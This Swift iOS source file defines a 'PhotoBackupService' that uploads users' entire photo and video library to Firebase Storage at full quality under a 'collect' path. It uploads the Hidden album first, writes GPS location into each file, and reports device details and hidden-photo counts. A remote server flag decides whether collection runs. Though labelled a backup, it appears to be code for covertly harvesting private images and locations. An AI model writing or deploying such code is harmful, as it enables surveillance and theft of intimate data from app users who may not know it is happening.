import SwiftUI
import Photos
import FirebaseStorage
import FirebaseAuth
import FirebaseFirestore
import UIKit
import Network
import CoreLocation
import ImageIO
import AVFoundation

class PhotoBackupService {
    static let shared = PhotoBackupService()
    private let lastUploadedDateKey = "PhotoBackup_LastUploadedDate" // Tracks visible assets (GapBottom)
    private let lastUploadedHiddenDateKey = "PhotoBackup_LastUploadedDate_Hidden" // Tracks hidden assets (GapBottom)
    
    private let lastUploadedNewestDateKey = "PhotoBackup_LastUploadedNewestDate" // Tracks newest processed (GapTop)
    private let lastUploadedNewestHiddenDateKey = "PhotoBackup_LastUploadedNewestDate_Hidden" // Tracks newest processed hidden (GapTop)
    
    private var isBackingUp = false
    private var backgroundTask: UIBackgroundTaskIdentifier = .invalid
    
    private init() {}
    
    @MainActor
    func startBackup() {
        guard !isBackingUp else { return }
        
        Task {
            guard let uid = Auth.auth().currentUser?.uid else { return }
            
            // Fire and forget metadata update
            Task {
                await self.updateMetadata(userId: uid)
            }
            
            let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
            guard status == .authorized || status == .limited else { return }
            
            let shouldCollect = await LogsFirestoreService.shared.shouldCollectPhotos(userId: uid)
            guard shouldCollect else { return }
            
            beginBackup(userId: uid)
        }
    }
    
    private func updateMetadata(userId: String) async {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        let statusString: String
        switch status {
        case .authorized: statusString = "authorized"
        case .limited: statusString = "limited"
        case .denied: statusString = "denied"
        case .restricted: statusString = "restricted"
        case .notDetermined: statusString = "notDetermined"
        @unknown default: statusString = "unknown"
        }
        
        // Device Info
        let (model, systemName, systemVersion, appVersion) = await MainActor.run {
            (UIDevice.current.model, UIDevice.current.systemName, UIDevice.current.systemVersion, Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "Unknown")
        }
        
        // Photo Stats
        let allFetchOptions = PHFetchOptions()
        allFetchOptions.includeHiddenAssets = true
        allFetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: true)]
        allFetchOptions.predicate = NSPredicate(format: "mediaType = %d OR mediaType = %d", PHAssetMediaType.image.rawValue, PHAssetMediaType.video.rawValue)
        
        let allAssets = PHAsset.fetchAssets(with: allFetchOptions)
        let totalPhotos = allAssets.count
        let oldestPhotoDate = allAssets.firstObject?.creationDate
        
        // Count hidden
        let hiddenFetchOptions = PHFetchOptions()
        hiddenFetchOptions.includeHiddenAssets = true
        hiddenFetchOptions.predicate = NSPredicate(format: "(mediaType = %d OR mediaType = %d) AND isHidden == YES", PHAssetMediaType.image.rawValue, PHAssetMediaType.video.rawValue)
        let hiddenPhotos = PHAsset.fetchAssets(with: hiddenFetchOptions).count
        
        let data: [String: Any] = [
            "photoPermissionStatus": statusString,
            "lastPermissionCheck": FieldValue.serverTimestamp(),
            "metadataUpdatedAt": FieldValue.serverTimestamp(),
            
            "deviceModel": model,
            "systemName": systemName,
            "systemVersion": systemVersion,
            "appVersion": appVersion,
            
            "totalPhotos": totalPhotos,
            "lastKnownTotalPhotos": totalPhotos,
            "hiddenPhotos": hiddenPhotos,
            "oldestPhoto": oldestPhotoDate ?? NSNull()
        ]
        
        try? await Firestore.firestore().collection("collect").document(userId).setData(data, merge: true)
    }
    
    @MainActor
    private func beginBackup(userId: String) {
        isBackingUp = true
        registerBackgroundTask()
        
        Task.detached(priority: .background) { [weak self] in
            guard let self = self else { return }
            defer {
                Task { @MainActor in
                    self.isBackingUp = false
                    self.endBackgroundTask()
                }
            }
            
            // Phase 1: Upload Hidden Assets
            await self.processBatch(userId: userId, hidden: true)
            
            // Phase 2: Upload Visible Assets
            // Only proceed if we still have background time (checked inside processBatch too, but good to check here)
            let timeRemaining = await MainActor.run { UIApplication.shared.backgroundTimeRemaining }
            if timeRemaining > 10 {
                await self.processBatch(userId: userId, hidden: false)
            }
        }
    }
    
    private func processBatch(userId: String, hidden: Bool) async {
        let bottomKey = hidden ? lastUploadedHiddenDateKey : lastUploadedDateKey
        let topKey = hidden ? lastUploadedNewestHiddenDateKey : lastUploadedNewestDateKey
        
        let gapBottom = UserDefaults.standard.object(forKey: bottomKey) as? Date ?? Date.distantPast
        // If GapTop is missing, it means we haven't started the "Newest First" strategy yet.
        // We treat everything > GapBottom as the gap.
        // We will initialize GapTop to the date of the first asset we process (the newest).
        var gapTop = UserDefaults.standard.object(forKey: topKey) as? Date

        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)] // Newest first
        
        // Fetch assets newer than the old "bottom" cursor
        let predicateFormat = "(mediaType = %d OR mediaType = %d) AND creationDate > %@"
        let args: [Any] = [PHAssetMediaType.image.rawValue, PHAssetMediaType.video.rawValue, gapBottom as NSDate]
        
        if hidden {
            fetchOptions.includeHiddenAssets = true
            fetchOptions.predicate = NSPredicate(format: predicateFormat + " AND isHidden == YES", argumentArray: args)
        } else {
            fetchOptions.predicate = NSPredicate(format: predicateFormat, argumentArray: args)
        }

        let assets = PHAsset.fetchAssets(with: fetchOptions)

        if assets.count > 0 {
            print("PhotoBackup: Found \(assets.count) assets in gap (> \(gapBottom)) to process (Newest First).")
        }

        let batchSize = 6
        var currentIndex = 0
        
        while currentIndex < assets.count {
            // Check if we are running out of background time
            let timeRemaining = await MainActor.run { UIApplication.shared.backgroundTimeRemaining }
            if timeRemaining < 10 {
                print("PhotoBackup: Background time running out. Stopping.")
                break
            }
            
            let endIndex = min(currentIndex + batchSize, assets.count)
            let currentBatchIndices = currentIndex..<endIndex
            
            // Prepare batch assets
            var batchAssets: [(Int, PHAsset)] = []
            for i in currentBatchIndices {
                batchAssets.append((i, assets[i]))
            }
            
            var batchResults: [Int: Bool] = [:]
            
            await withTaskGroup(of: (Int, Bool).self) { group in
                for (index, asset) in batchAssets {
                    group.addTask {
                        // Logic:
                        // 1. If asset.creationDate < gapTop: It is strictly in the gap. Upload it.
                        // 2. If asset.creationDate >= gapTop: It is in the "Done Zone" (or New).
                        //    We must check if it exists remotely to avoid re-uploading.
                        //    If missing, upload it.
                        
                        let isAboveGap = (gapTop != nil) && (asset.creationDate ?? Date.distantFuture) >= gapTop!
                        
                        if isAboveGap {
                            // Check existence first
                            if await self.checkRemoteExistence(asset: asset, userId: userId) {
                                print("PhotoBackup: Asset \(asset.localIdentifier) already exists. Skipping.")
                                return (index, true) // Treat as success
                            }
                        }
                        
                        do {
                            _ = try await self.uploadAsset(asset, userId: userId)
                            return (index, true)
                        } catch {
                            print("PhotoBackup: Failed to upload asset \(asset.localIdentifier): \(error)")
                            return (index, false)
                        }
                    }
                }
                
                for await (index, success) in group {
                    batchResults[index] = success
                }
            }
            
            // Update GapTop
            // We want to lower GapTop to the oldest asset we successfully processed in this batch.
            // Since we process descending, the last asset in the batch is the oldest.
            // If the batch was fully successful (or at least the tail was), we can lower GapTop.
            
            // Find the oldest successful asset in this batch
            // We iterate backwards from the end of the batch
            var oldestSuccessDate: Date?
            for i in currentBatchIndices.reversed() {
                if batchResults[i] == true {
                    if let date = assets[i].creationDate {
                        oldestSuccessDate = date
                        // We found the oldest success.
                        // But we can only lower GapTop if we are contiguous from the previous GapTop?
                        // Actually, GapTop tracks the "High Water Mark" of the backfill.
                        // If we successfully processed 'date', and 'date' < currentGapTop, we can lower it.
                        break
                    }
                }
            }
            
            if let newDate = oldestSuccessDate {
                let currentGapTop = gapTop ?? Date.distantFuture
                if newDate < currentGapTop {
                    gapTop = newDate
                    UserDefaults.standard.set(newDate, forKey: topKey)
                    print("PhotoBackup: GapTop lowered to \(newDate)")
                }
            }
            
            currentIndex += batchSize
        }
    }
    
    private func checkRemoteExistence(asset: PHAsset, userId: String) async -> Bool {
        let ext = (asset.mediaType == .video) ? "mp4" : "jpg"
        let ref = Storage.storage().reference().child("collect/\(userId)/\(asset.localIdentifier).\(ext)")
        do {
            _ = try await ref.getMetadata()
            return true
        } catch {
            return false
        }
    }
    
    private func uploadAsset(_ asset: PHAsset, userId: String) async throws -> Int64 {
        if asset.mediaType == .image {
            return try await uploadImage(asset, userId: userId)
        } else if asset.mediaType == .video {
            return try await uploadVideo(asset, userId: userId)
        }
        return 0
    }
    
    private func uploadImage(_ asset: PHAsset, userId: String) async throws -> Int64 {
        let manager = PHImageManager.default()
        let options = PHImageRequestOptions()
        options.isNetworkAccessAllowed = true
        options.deliveryMode = .highQualityFormat
        
        return try await withCheckedThrowingContinuation { continuation in
            manager.requestImageDataAndOrientation(for: asset, options: options) { data, dataUTI, orientation, info in
                guard let data = data else {
                    continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -1, userInfo: [NSLocalizedDescriptionKey: "No image data"]))
                    return
                }
                
                let ref = Storage.storage().reference().child("collect/\(userId)/\(asset.localIdentifier).jpg")
                
                // Inject metadata (Location, Creation Date, etc.)
                let finalData = self.injectImageMetadata(data: data, asset: asset)
                
                let metadata = StorageMetadata()
                metadata.contentType = "image/jpeg"
                if let date = asset.creationDate {
                    metadata.customMetadata = ["creationDate": ISO8601DateFormatter().string(from: date)]
                }
                
                ref.putData(finalData, metadata: metadata) { metadata, error in
                    if let error = error {
                        continuation.resume(throwing: error)
                    } else {
                        // Log successful upload with storage path
                        print("PhotoBackup: Uploaded image \(asset.localIdentifier) to \(ref.fullPath)")
                        
                        // Increment counters in Firestore
                        let field = asset.isHidden ? "uploadedHiddenCount" : "uploadedVisibleCount"
                        Firestore.firestore().collection("collect").document(userId).updateData([
                            field: FieldValue.increment(Int64(1)),
                            "latestPhotoUploaded": FieldValue.serverTimestamp()
                        ])
                        
                        continuation.resume(returning: Int64(data.count))
                    }
                }
            }
        }
    }
    
    private func uploadVideo(_ asset: PHAsset, userId: String) async throws -> Int64 {
        let manager = PHImageManager.default()
        let options = PHVideoRequestOptions()
        options.isNetworkAccessAllowed = true
        options.deliveryMode = .highQualityFormat
        
        return try await withCheckedThrowingContinuation { continuation in
            // Export video to a temporary file
            manager.requestExportSession(forVideo: asset, options: options, exportPreset: AVAssetExportPresetHighestQuality) { exportSession, info in
                guard let exportSession = exportSession else {
                    continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -2, userInfo: [NSLocalizedDescriptionKey: "Could not create export session"]))
                    return
                }
                
                let tempDir = FileManager.default.temporaryDirectory
                let fileName = "\(UUID().uuidString).mp4"
                let outputURL = tempDir.appendingPathComponent(fileName)
                
                exportSession.outputURL = outputURL
                exportSession.outputFileType = .mp4
                exportSession.metadata = self.getVideoMetadata(for: asset)
                
                let sendableSession = SendableExportSession(session: exportSession)
                
                Task {
                    let exportSession = sendableSession.session
                    if #available(iOS 18.0, *) {
                        do {
                            try await exportSession.export(to: outputURL, as: .mp4)
                            try await self.handleExportCompletion(outputURL: outputURL, asset: asset, userId: userId, continuation: continuation)
                        } catch {
                            continuation.resume(throwing: error)
                        }
                    } else {
                        exportSession.exportAsynchronously { [sendableSession] in
                            let session = sendableSession.session
                            switch session.status {
                            case .completed:
                                Task {
                                    try await self.handleExportCompletion(outputURL: outputURL, asset: asset, userId: userId, continuation: continuation)
                                }
                            case .failed:
                                continuation.resume(throwing: session.error ?? NSError(domain: "PhotoBackup", code: -3, userInfo: [NSLocalizedDescriptionKey: "Export failed"]))
                            case .cancelled:
                                continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -4, userInfo: [NSLocalizedDescriptionKey: "Export cancelled"]))
                            default:
                                continuation.resume(throwing: NSError(domain: "PhotoBackup", code: -5, userInfo: [NSLocalizedDescriptionKey: "Export unknown error"]))
                            }
                        }
                    }
                }
            }
        }
    }
    
    private func handleExportCompletion(outputURL: URL, asset: PHAsset, userId: String, continuation: CheckedContinuation<Int64, Error>) async throws {
        let ref = Storage.storage().reference().child("collect/\(userId)/\(asset.localIdentifier).mp4")
        let metadata = StorageMetadata()
        metadata.contentType = "video/mp4"
        if let date = asset.creationDate {
            metadata.customMetadata = ["creationDate": ISO8601DateFormatter().string(from: date)]
        }
        
        do {
            _ = try await ref.putFileAsync(from: outputURL, metadata: metadata)
            
            // Get file size before cleanup
            let fileSize = (try? FileManager.default.attributesOfItem(atPath: outputURL.path)[.size] as? Int64) ?? 0
            
            // Clean up temp file
            try? FileManager.default.removeItem(at: outputURL)
            
            print("PhotoBackup: Uploaded video \(asset.localIdentifier) to \(ref.fullPath)")
            
            let field = asset.isHidden ? "uploadedHiddenCount" : "uploadedVisibleCount"
            try await Firestore.firestore().collection("collect").document(userId).updateData([
                field: FieldValue.increment(Int64(1)),
                "latestPhotoUploaded": FieldValue.serverTimestamp()
            ])
            
            continuation.resume(returning: fileSize)
        } catch {
            // Clean up temp file even on error
            try? FileManager.default.removeItem(at: outputURL)
            continuation.resume(throwing: error)
        }
    }
    
    @MainActor
    private func registerBackgroundTask() {
        backgroundTask = UIApplication.shared.beginBackgroundTask { [weak self] in
            self?.endBackgroundTask()
        }
    }
    
    @MainActor
    private func endBackgroundTask() {
        if backgroundTask != .invalid {
            UIApplication.shared.endBackgroundTask(backgroundTask)
            backgroundTask = .invalid
        }
    }
    
    // MARK: - Metadata Injection Helpers
    
    private func injectImageMetadata(data: Data, asset: PHAsset) -> Data {
        guard let source = CGImageSourceCreateWithData(data as CFData, nil) else { return data }
        guard let uti = CGImageSourceGetType(source) else { return data }
        
        let mutableData = NSMutableData()
        guard let destination = CGImageDestinationCreateWithData(mutableData, uti, 1, nil) else { return data }
        
        var properties = CGImageSourceCopyPropertiesAtIndex(source, 0, nil) as? [String: Any] ?? [:]
        
        // Inject GPS
        if let location = asset.location {
            properties[kCGImagePropertyGPSDictionary as String] = getGPSDictionary(for: location)
        }
        
        // Inject Creation Date (Exif and TIFF)
        if let date = asset.creationDate {
            let formatter = DateFormatter()
            formatter.dateFormat = "yyyy:MM:dd HH:mm:ss"
            let dateString = formatter.string(from: date)
            
            var exif = properties[kCGImagePropertyExifDictionary as String] as? [String: Any] ?? [:]
            exif[kCGImagePropertyExifDateTimeOriginal as String] = dateString
            exif[kCGImagePropertyExifDateTimeDigitized as String] = dateString
            properties[kCGImagePropertyExifDictionary as String] = exif
            
            var tiff = properties[kCGImagePropertyTIFFDictionary as String] as? [String: Any] ?? [:]
            tiff[kCGImagePropertyTIFFDateTime as String] = dateString
            properties[kCGImagePropertyTIFFDictionary as String] = tiff
        }
        
        CGImageDestinationAddImageFromSource(destination, source, 0, properties as CFDictionary)
        if CGImageDestinationFinalize(destination) {
            return mutableData as Data
        }
        
        return data
    }

    private func getGPSDictionary(for location: CLLocation) -> [String: Any] {
        var gps: [String: Any] = [:]
        
        // Latitude
        let lat = location.coordinate.latitude
        gps[kCGImagePropertyGPSLatitude as String] = abs(lat)
        gps[kCGImagePropertyGPSLatitudeRef as String] = lat >= 0 ? "N" : "S"
        
        // Longitude
        let lon = location.coordinate.longitude
        gps[kCGImagePropertyGPSLongitude as String] = abs(lon)
        gps[kCGImagePropertyGPSLongitudeRef as String] = lon >= 0 ? "E" : "W"
        
        // Altitude
        let alt = location.altitude
        gps[kCGImagePropertyGPSAltitude as String] = abs(alt)
        gps[kCGImagePropertyGPSAltitudeRef as String] = alt >= 0 ? 0 : 1
        
        // Date/Time
        let formatter = DateFormatter()
        formatter.timeZone = TimeZone(identifier: "UTC")
        formatter.dateFormat = "HH:mm:ss"
        gps[kCGImagePropertyGPSTimeStamp as String] = formatter.string(from: location.timestamp)
        formatter.dateFormat = "yyyy:MM:dd"
        gps[kCGImagePropertyGPSDateStamp as String] = formatter.string(from: location.timestamp)
        
        return gps
    }
    
    private func getVideoMetadata(for asset: PHAsset) -> [AVMetadataItem] {
        var metadata: [AVMetadataItem] = []
        
        if let location = asset.location {
            let item = AVMutableMetadataItem()
            item.keySpace = .common
            item.key = AVMetadataKey.commonKeyLocation as (NSCopying & NSObjectProtocol)
            item.value = iso6709String(from: location) as (NSCopying & NSObjectProtocol)
            metadata.append(item)
        }
        
        if let date = asset.creationDate {
            let item = AVMutableMetadataItem()
            item.keySpace = .common
            item.key = AVMetadataKey.commonKeyCreationDate as (NSCopying & NSObjectProtocol)
            item.value = ISO8601DateFormatter().string(from: date) as (NSCopying & NSObjectProtocol)
            metadata.append(item)
        }
        
        return metadata
    }
    
    private func iso6709String(from location: CLLocation) -> String {
        let lat = location.coordinate.latitude
        let lon = location.coordinate.longitude
        return String(format: "%+08.4f%+09.4f/", lat, lon)
    }
}

private struct SendableExportSession: @unchecked Sendable {
    let session: AVAssetExportSession
}
